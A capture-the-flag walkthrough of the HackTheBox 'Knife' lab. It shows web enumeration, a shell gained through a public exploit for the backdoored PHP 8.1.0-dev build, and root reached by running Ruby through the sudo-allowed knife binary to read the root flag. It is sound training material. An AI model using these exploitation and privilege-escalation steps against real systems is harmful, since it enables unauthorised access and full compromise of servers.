---
title: HTB -- Knife
date: 2022-01-20
layout: single
header:
  teaser: assets/images/htb/knife/teaser.png
excerpt: Beginner box teaching web enumeration, php exploitation, and why you shouldn't let users run commands as root.
classes: wide
categories:
  - hackthebox
tags:
  - hackthebox
  - OSCP
---

### Summary
![](/assets/images/htb/knife/intro.png)

Knife is another great beginner box for practicing web enumeration. A foothold is found through outdated php leading to a basic shell. From there, the binary `knife` is found to be runnable with sudo, leading to privesc.

# Recon

We see that 22 and 80 are open, looks like a web based box.

![](/assets/images/htb/knife/rustscan.png)

## Web

Browsing to knife.htb gives us the following

![](/assets/images/htb/knife/web.png)

* Directory Brute Force
  * `feroxbuster -u http://knife.htb`
    * Not much returned here -> increase scope
  * `feroxbuster -u http://knife.htb -x php txt js`
    * Only `index.php` is returned
* Subdomain Search
  * `ffuf -w ~/HTB/horizontal/subdomains-top1million-110000.txt -u http://10.10.10.242 -H "Host: FUZZ.knife.htb" | grep -v 200`
  * No results
* Inspection of `Index.php`
  * Looks pretty normal, no input fields or hidden comments
  * Burp suite doesn't show anything weid either
* Nikto
  * `nikto -h http://knife.htb`
  * Apache/2.4.41 (Ubuntu)
  * PHP/8.1.0-dev
    * dev?? this is interesting

## Exploiting PHP

Googling for `PHP/8.1.0-dev` [turns up some CVEs](https://www.exploit-db.com/exploits/49933). The story behind this attack is thatsomeone was able to insert a backdoor into php and keep it hidden, only triggered by a useragent header starting with 'zerodium'. There is a [whole writeup on the exploit](https://flast101.github.io/php-8.1.0-dev-backdoor-rce/) where you can learn more. After looking at the source to understand what params it needs:

```
python3 49933                                                                                             
Enter the full host url:
http://knife.htb

Interactive shell is opened on http://knife.htb 
Can't acces tty; job crontol turned off.
$ whoami
james
```

## Privesc

Amongst privesc methodologies, there are a few low hanging fruit items I like checking before going into a pspy + linpeas workflow. First command I always run is `id` to check groups i'm a part of -- followed by `sudo -l` to see if the box uses sudo for privesc.

```
$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

Sure enough, it does! GTFOBins should give [examples of how to get root from here](https://gtfobins.github.io/gtfobins/knife)

![](/assets/images/htb/knife/gtfo.png)

Seems that the state of the restricted shell doesn't play nice with this method of getting root. The GTFOBins page also specifies that knife can run ruby code, so a oneliner to print the flag should work fine.

```
$ echo "data = File.read(\"/root/root.txt\"); puts data" > ~/win.rb 

$ sudo knife exec ~/win.rb
05d718*****************
```

root!

